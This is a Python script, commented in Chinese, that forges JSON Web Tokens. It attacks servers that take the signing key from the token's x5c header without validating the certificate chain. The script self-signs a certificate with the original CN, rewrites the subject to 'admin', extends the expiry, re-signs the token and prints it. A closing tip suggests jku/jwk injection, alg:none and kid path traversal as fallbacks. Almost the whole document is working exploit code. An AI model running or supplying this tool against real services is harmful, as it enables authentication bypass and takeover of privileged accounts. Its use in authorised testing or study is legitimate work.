#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT x5c 注入伪造工具
原理：验证端直接从 header.x5c 取证书公钥验签，却不校验证书链/白名单。
做法：自签一张 CN 相同的证书塞入 x5c，用自己的私钥重新签名。
用法：python3 x5c_forge.py <原始JWT> [要伪造的身份]
依赖：pip install cryptography
"""

import sys
import json
import time
import base64
import datetime

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge(token: str, new_sub: str = "admin", extend_exp: int = 86400) -> str:
    header, payload, _sig = token.split(".")
    header = json.loads(b64url_decode(header))
    payload = json.loads(b64url_decode(payload))

    # 1. 从原 x5c 中读 CN，保证伪造证书“长得像”原证书
    orig_cert = x509.load_der_x509_certificate(base64.b64decode(header["x5c"][0]))
    try:
        cn = orig_cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
    except Exception:
        cn = payload.get("iss", "localhost")
    print(f"[*] 原证书 CN: {cn}")

    # 2. 生成我们自己的 RSA 密钥对
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    # 3. 自签证书（CN 与原证书一致）
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(priv.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=365))
        .sign(priv, hashes.SHA256())
    )
    x5c_b64 = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()

    # 4. 篡改 payload
    payload["sub"] = new_sub
    if extend_exp:
        payload["exp"] = int(time.time()) + extend_exp
    print(f"[*] 新 payload: {payload}")

    # 5. 用我们的私钥 RS256 签名
    new_header = {"alg": "RS256", "typ": "JWT", "x5c": [x5c_b64]}
    signing_input = (
        b64url(json.dumps(new_header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = priv.sign(signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())

    forged = signing_input + "." + b64url(sig)

    # 6. 本地自验：用伪造 token 自带的 x5c 证书验签
    pub = cert.public_key()
    pub.verify(sig, signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
    print("[+] 本地验签通过")

    return forged


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3.13 {sys.argv[0]} <原始JWT> ")
        sys.exit(1)

    token = sys.argv[1].strip()
    forged = forge(token)

    print("\n===== 伪造的 Token =====")
    print(forged)
    print("=======================")
    print("提示: 若服务端返回 401，说明它做了证书链/指纹白名单校验，")
    print("      可改试 jku/jwk 注入、alg:none 或 kid 路径穿越等手法。")
